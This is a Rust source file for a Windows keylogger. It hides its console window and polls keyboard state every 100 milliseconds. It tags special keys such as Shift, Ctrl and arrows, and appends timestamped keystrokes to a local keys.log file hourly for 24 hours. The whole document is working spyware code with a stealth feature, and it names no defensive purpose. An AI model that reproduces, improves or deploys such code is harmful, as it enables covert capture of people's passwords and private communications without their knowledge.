//Created 09/01/2024
//Sebastian Hyjek

use std::thread::sleep;
use std::time::{Duration, Instant};
use std::fs::OpenOptions;
use std::io::Write;
use windows::Win32::System::Console::GetConsoleWindow;
use windows::Win32::UI::Input::KeyboardAndMouse::*;
use windows::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
use chrono::prelude::*;

#[macro_use]
extern crate lazy_static;
use std::collections::VecDeque;
use std::env::*;
use std::sync::Mutex;

lazy_static! {
    static ref GLOBAL_BUFFER: Mutex<VecDeque<String>> = Mutex::new(VecDeque::new());
}

fn add_to_buffer(item: Option<char>) {
    let mut buffer = GLOBAL_BUFFER.lock().unwrap();
    buffer.push_back(item.expect("failed to push char onto buffer").to_string());
}
fn write_data() {
    let local_timestamp: DateTime<Local> = Local::now();

    let binding = current_dir().unwrap();
    let pwd = binding.to_str().unwrap();

    let file_path = format!("{}\\keys.log", pwd);

    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .create(true)
        .open(file_path)
        .expect("Failed to write to or create the file");

    let mut data = GLOBAL_BUFFER.lock().unwrap();
    let concatenated_data: String = data.iter().cloned().collect::<Vec<String>>().join("");
    let entry = format!("{} {}\n", local_timestamp, concatenated_data);

    file.write_all(entry.as_bytes()).unwrap();
    data.clear();
    assert!(data.is_empty());
}

unsafe fn log_keys() {
    let _ = ShowWindow(GetConsoleWindow(), SW_HIDE);

    for key in 8..=190 {
        if GetAsyncKeyState(key) == -32767 {
            if is_special_key(key) == false {
                add_to_buffer(char::from_u32(key as u32));
            }
        }
    }
}

unsafe fn is_special_key(key: i32) -> bool {
    let mut buffer = GLOBAL_BUFFER.lock().unwrap();

    match key {
        k if k == VK_SPACE.0 as i32 => {
            println!(" ");
            buffer.push_back(" ".to_string());
            true
        }
        k if k == VK_RETURN.0 as i32 => {
            println!("\n");
            buffer.push_back("\n".to_string());
            true
        }
        k if k == VK_OEM_PERIOD.0 as i32 => {
            println!(".");
            buffer.push_back(".".to_string());
            true
        }
        k if k == VK_SHIFT.0 as i32 => {
            println!("#SHIFT#");
            buffer.push_back("#SHIFT#".to_string());
            true
        }
        k if k == VK_BACK.0 as i32 => {
            println!("\u{0008}");
            buffer.push_back("\u{0008}".to_string());
            true
        }
        k if k == VK_RBUTTON.0 as i32 => {
            println!("#R_CLICK#");
            buffer.push_back("#R_CLICK#".to_string());
            true
        }
        k if k == VK_CAPITAL.0 as i32 => {
            println!("#CAPS_LOCK#");
            buffer.push_back("#CAPS_LOCK#".to_string());
            true
        }
        k if k == VK_TAB.0 as i32 => {
            println!("#TAB#");
            buffer.push_back("TAB".to_string());
            true
        }
        k if k == VK_UP.0 as i32 => {
            println!("#UP");
            buffer.push_back("#UP".to_string());
            true
        }
        k if k == VK_DOWN.0 as i32 => {
            println!("#DOWN");
            buffer.push_back("#DOWN".to_string());
            true
        }
        k if k == VK_LEFT.0 as i32 => {
            println!("#LEFT");
            buffer.push_back("#LEFT".to_string());
            true
        }
        k if k == VK_RIGHT.0 as i32 => {
            println!("#RIGHT");
            buffer.push_back("#RIGHT".to_string());
            true
        }
        k if k == VK_CONTROL.0 as i32 => {
            println!("#CONTROL");
            buffer.push_back("#CONTROL".to_string());
            true
        }
        k if k == VK_MENU.0 as i32 => {
            println!("#ALT");
            buffer.push_back("#ALT".to_string());
            true
        }

        _ => false,
    }
}

fn main() {


    let start = Instant::now();
    let total_time = Duration::from_secs(24 * 60 * 60);
    let end = start + total_time;
    let one_hour = Duration::from_secs(60 * 60);
    let mut next_write_time = start + one_hour;

    loop {
        if Instant::now() > end {
            write_data();
            break;
        }
        unsafe {
            log_keys();
        }
        if Instant::now() >= next_write_time {
            write_data();
            next_write_time += one_hour;
        }

        sleep(Duration::from_millis(100));
    }
}
